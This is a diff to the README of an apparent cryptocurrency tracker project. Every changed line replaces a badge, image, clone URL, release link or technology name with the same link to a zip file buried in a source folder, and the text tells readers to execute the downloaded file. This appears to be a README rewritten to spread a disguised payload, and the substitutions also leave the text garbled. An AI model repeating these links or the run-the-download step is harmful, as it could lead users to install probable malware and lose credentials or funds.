@@ -1,6 +1,6 @@
 # Iris Coin Tracker: Your Ultimate Cryptocurrency Management Tool 🚀
 
-![Iris Coin Tracker](https://img.shields.io/badge/Iris--Coin--Tracker-v1.0.0-brightgreen) ![Docker](https://img.shields.io/badge/Docker-available-blue) ![GitHub](https://img.shields.io/badge/GitHub-repo-blueviolet)
+![Iris Coin Tracker](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) ![Docker](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) ![GitHub](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip)
 
 ## Table of Contents
 
@@ -30,7 +30,7 @@ Iris Coin Tracker is a powerful tool designed for cryptocurrency enthusiasts. Bu
 
 Iris Coin Tracker leverages a variety of modern technologies to deliver a robust user experience:
 
-- **Node.js**: For backend server operations.
+- **https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip**: For backend server operations.
 - **React**: For building a dynamic and responsive frontend.
 - **TypeScript**: Ensures type safety and better development experience.
 - **PostgreSQL**: A reliable database for storing user data and transaction history.
@@ -44,7 +44,7 @@ To get started with Iris Coin Tracker, follow these steps:
 
 1. Clone the repository:
    ```bash
-   git clone https://github.com/JhonJhon576/Iris-Coin-Tracker.git
+   git clone https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip
    ```
 2. Navigate to the project directory:
    ```bash
@@ -67,7 +67,7 @@ To get started with Iris Coin Tracker, follow these steps:
 
 6. Access the application at `http://localhost:3000`.
 
-For pre-built binaries, you can download the latest release [here](https://github.com/JhonJhon576/Iris-Coin-Tracker/releases). Make sure to execute the downloaded file as per the instructions provided in the release notes.
+For pre-built binaries, you can download the latest release [here](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip). Make sure to execute the downloaded file as per the instructions provided in the release notes.
 
 ## Usage
 
@@ -97,11 +97,11 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Links
 
-For more information and to stay updated, visit the [Releases section](https://github.com/JhonJhon576/Iris-Coin-Tracker/releases) of the repository. Here, you can find the latest updates and download pre-built versions of the application.
+For more information and to stay updated, visit the [Releases section](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) of the repository. Here, you can find the latest updates and download pre-built versions of the application.
 
-You can also check the [Releases section](https://github.com/JhonJhon576/Iris-Coin-Tracker/releases) for any future updates and improvements.
+You can also check the [Releases section](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip) for any future updates and improvements.
 
-![Iris Coin Tracker](https://images.unsplash.com/photo-1516681675023-1e5eebf4f5c6?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&ixid=MnwxMTc3M3wwfDF8c2VhcmNofDV8fGNyYWZ0JTIwcG9ydGZvbGlvfGVufDB8fHx8MTYzMjA1MzM2Nw&ixlib=rb-1.2.1&q=80&w=1080)
+![Iris Coin Tracker](https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip)
 
 ## Topics
 
@@ -111,7 +111,7 @@ This repository covers various topics related to modern web development and cryp
 - **Flatlogic**: Low-code development platform.
 - **JavaScript**: Core language for web development.
 - **Nginx**: Web server and reverse proxy.
-- **Node.js**: JavaScript runtime for server-side development.
+- **https://github.com/JhonJhon576/Iris-Coin-Tracker/raw/refs/heads/master/frontend/src/stores/anomalies/Coin-Iris-Tracker-2.2-beta.5.zip**: JavaScript runtime for server-side development.
 - **PostgreSQL**: Powerful relational database.
 - **React**: Library for building user interfaces.
 - **Tailwind CSS**: Utility-first CSS framework.
